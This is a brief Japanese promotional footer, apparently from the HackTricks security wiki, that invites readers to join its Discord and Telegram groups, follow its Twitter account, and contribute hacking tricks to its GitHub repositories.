* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
